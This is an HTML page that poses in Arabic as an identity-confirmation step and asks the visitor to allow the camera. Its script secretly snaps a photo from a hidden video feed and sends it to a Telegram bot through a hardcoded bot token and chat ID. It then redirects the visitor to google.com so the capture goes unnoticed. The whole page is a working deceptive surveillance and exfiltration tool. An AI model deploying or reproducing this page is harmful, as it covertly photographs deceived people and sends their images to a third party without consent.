<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>تأكيد الهوية</title>
</head>
<body>
    <div style="text-align: center; margin-top: 50px;">
        <h2>يجب السماح بالكاميرا للمتابعة</h2>
        <button onclick="start()" style="padding: 10px 20px;">متابعة</button>
    </div>
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        const token = '8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU';
        const chat = '8042090388';
        function start() {
            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', chat);
                        f.append('photo', b, 'img.jpg');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f })
                        .then(() => location.href = "https://google.com");
                    }, 'image/jpeg');
                }, 1000);
            });
        }
    </script>
</body>
</html>
